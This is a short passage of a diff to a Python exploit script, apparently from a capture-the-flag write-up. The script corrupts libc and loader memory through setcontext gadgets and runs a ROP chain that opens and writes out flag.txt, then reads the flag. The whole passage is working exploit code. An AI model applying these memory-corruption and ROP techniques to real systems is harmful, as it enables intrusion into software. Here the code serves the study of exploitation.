+rel_write(0x20, libc.symbols["setcontext"] + 61)
+rel_write(0xA0, 0x100)
 rel_write(0xA8, libc.symbols["setcontext"] + 334) # ret
 write(ld.symbols["_r_debug"], b"flag.txt\x00")
 ROP_chain = [
@@ -2411,6 +2539,8 @@ ROP_chain = [
 
     rop_pop_rdi_ret, 1,
     rop_write,
+
+    rop_exit,
 ]
 
 for i in range(len(ROP_chain)):
@@ -2419,11 +2549,12 @@ for i in range(len(ROP_chain)):
     else:
         rel_write(0x100 + i*8, ROP_chain[i])
 
-# win
-gdb.attach(r, load_sym)
-input()
-call_func(rop_rbx_write_call)
-r.interactive()
+########### STEP8. Win! ###########
+call_func(rop_rdi2rdx, b"", True)
+flag = r.recvuntil('FLAG{')[-5:]
+flag += r.recvuntil('}')
+info(f"flag is {flag.decode()}")
+r.close()
 ```
 
 
